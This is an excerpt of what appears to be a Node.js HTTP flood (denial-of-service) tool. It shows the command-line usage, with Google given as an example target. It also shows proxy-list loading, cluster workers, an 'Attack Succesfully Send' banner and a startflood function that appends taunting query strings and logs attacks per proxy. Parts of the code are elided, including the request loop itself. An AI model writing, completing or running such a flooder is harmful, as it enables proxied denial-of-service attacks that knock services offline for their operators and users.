...
function log(string) {
    console.log(gradient('orange', 'white')(`${string}`));
}

if (process.argv.length == 2) {
    log(`Incorrect usage!`);
    log(`Usage: node ${file} <host> <time> <threads> <rps> <proxies>`);
    log(`Example: node ${file} https://google.com 60 8 8 proxy.txt`);
    process.exit(1);
}

if (process.argv.length < 6) {
    log(`Incorrect usage!`);
    log(`Usage: node ${file} <host> <time> <threads> <rps> <proxy>`);
    //log(`Example: node ${file} https://shitflare.asia 60 10 64 proxy.txt --debug=true --ua=windows --querystring=true`);
    log(`Example: node ${file} https://google.com 60 8 8 proxy.txt`);
    process.exit(1);
}
...
if (cluster.isMaster) {
    ...
    console.clear();
    const text = `
𝓣𝓱𝓲𝓼𝓼𝓬𝓻𝓲𝓹𝓽𝓯𝓸𝓻𝓪𝓷𝓭𝓲𝓮𝓻𝓬


                         
                ╔═════════════════════════════════╗
                   🚀 Attack Succesfully Send 🚀
                   
                      Proxy:      ${fs.readFileSync(proxyT, 'utf-8').toString().replace(/\r/g, '').split('\n').length} proxies.
...
function startflood() {
    ...
    if (querystringT == 'true') {
        querystring = parsed.path + "?" + ra(4) + "=" + "You Down Now!";
    }
    ...
    if (debug == 'true') {
        log(`(Flood) Attacking from ${proxy[0]}:${proxy[1]} `);
    }
